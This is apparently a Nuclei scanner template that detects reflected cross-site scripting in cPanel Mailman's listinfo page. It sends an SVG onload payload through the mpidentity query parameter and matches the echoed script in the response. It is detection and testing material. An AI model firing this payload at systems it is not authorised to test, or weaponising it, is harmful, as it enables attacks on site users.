http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - </script><svg/onload=alert(document.domain)>
    - mailman
    - gnu-head-tiny
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E'
id: cpanel-mailman-xss
info:
  author: yshahinzadeh,amirmsafari
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cwe-id: CWE-80
  description: 'cPanel Mailman listinfo reflects the `mpidentity` query parameter
    into the HTML response without proper output encoding, resulting in reflected
    cross-site scripting.

    '
  metadata:
    max-request: 1
    verified: true
  name: cPanel Mailman - Cross-Site Scripting
  reference:
  - https://blog.voorivex.team/two-cpanel-zero-day-vulnerabilities
  severity: medium
  tags: cpanel,mailman,vuln,xss
